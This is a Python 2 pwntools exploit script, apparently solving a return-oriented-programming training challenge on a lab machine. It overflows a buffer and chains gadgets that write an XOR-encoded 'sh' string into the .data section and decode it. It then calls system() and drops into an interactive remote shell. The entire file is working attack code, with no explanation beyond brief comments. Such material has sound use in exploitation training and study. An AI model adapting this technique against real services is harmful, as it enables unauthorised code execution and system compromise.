#!/usr/bin/env python2

from pwn import *

# remote connection
p = remote("192.168.56.102", 8888)

bad_char = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1

# useful address
system_plt = p32(0x080484e0)
raw_data_section = 0x0804a038
data_section = p32(0x0804a038)

xor_lebx_cl = p32(0x08048890)
pop_ebx_ecx = p32(0x08048896)
pop_esi_edi = p32(0x08048899)
mov_ledi_esi = p32(0x08048893)

# helper function to encrypt string 'sh\x00\x00'
while (1):
    binsh = ""
    for i in "sh\x00\x00":
        c = ord(i) ^ xor_byte
        if c in bad_char:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 4:
        break

# Stage one: write encrypted string to data_section
buf = ""
buf += "A"*44
buf += pop_esi_edi
buf += binsh
buf += data_section
buf += mov_ledi_esi

# Stage two: use xor gadget to decrypt string back to 'sh'
# decrypt helper function
for i in range(len(binsh)):
    buf += pop_ebx_ecx
    buf += p32(raw_data_section+i)
    buf += p32(xor_byte)
    buf += xor_lebx_cl

# Stage three: call system and execute 'sh'
buf += system_plt
buf += "BBBB"
buf += data_section

log.info("Sending buffer length: %d" % len(buf))
log.info("The xor byte is: 0x%x" % xor_byte)

print p.recvuntil('>')
p.sendline(buf)
p.interactive()
